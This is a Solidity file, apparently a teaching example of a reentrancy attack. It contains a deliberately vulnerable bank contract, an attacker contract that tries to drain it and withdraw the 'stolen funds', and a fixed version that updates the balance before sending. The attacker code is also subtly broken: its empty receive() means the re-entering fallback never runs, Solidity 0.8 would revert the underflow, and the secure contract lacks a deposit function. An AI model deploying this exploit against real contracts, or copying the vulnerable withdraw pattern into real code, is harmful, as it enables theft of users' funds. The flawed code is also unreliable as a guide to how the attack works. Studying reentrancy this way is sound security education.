// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Deposit ether into the contract
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= _amount; 
    }

    // Check the balance of an address
    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }
}


pragma solidity ^0.8.0;

contract Penetration {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }


    // to silence the warning
    receive() external payable {}



    // Fallback function to re-enter the withdraw function
    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    // Attack function to start the reentrancy attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw(1 ether);
    }

    // Function to withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}




// Reentrancy Attack (Critical Severity)
pragma solidity ^0.8.0;

contract SecureBank {
    mapping(address => uint256) public balances;

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // Update balance first to prevent reentrancy
        balances[msg.sender] -= _amount;

        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}